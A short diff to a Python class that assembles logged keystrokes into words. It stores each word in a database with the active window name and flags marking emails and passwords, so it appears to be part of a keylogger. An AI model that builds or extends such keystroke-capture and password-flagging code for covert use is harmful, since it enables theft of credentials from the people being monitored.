@@ -53,16 +53,19 @@ class Process:
     #         Words Processing           
     #                                     
     #######################################
-    
+    '''
+    This function appends characters to word
+    If the character receieved is a space or return (i.e break char), then we push the word that we have collected to the words database
+    - Also check that if the first key we recieve is a Space or return, that this is not pushed to database
+    '''
     def appendWord(self,data):
-    #loop through items in log and append characters on key-down
-        if (data['processedKey']):
+        if (data['processedKey'] != ""):
             if (len(self.word) == 0):
                 self.payload['datetime'] = data['datetime']
                 self.payload['epoch'] = data['epochTime']
                 self.payload['windowName'] = data['windowName']
             self.word += data['processedKey']
-        else:
+        elif (data['keyName'] == "Space" or data['keyName'] == "Return" and self.payload['datetime'] != ""):
             #TODO: if last word, add the time pressed as end time
             self.payload['processedWord'] = self.word
             self.resetWord()
@@ -102,8 +105,6 @@ class Process:
 
         sql = f"INSERT INTO {self.cfg['dbWordTable']} {self.cfg['dbWordRows']} VALUES (%s, %s, %s, %s, %s, %s)"
         val = (f"{self.payload['datetime']}", f"{self.payload['epoch']}", f"{self.payload['windowName']}", f"{self.payload['processedWord']}",f"{self.payload['isEmail']}", f"{self.payload['isPassword']}")
-        
-        print(sql,val)
         
         mycursor.execute(sql, val)
         self.payload['processedWord'] = ""
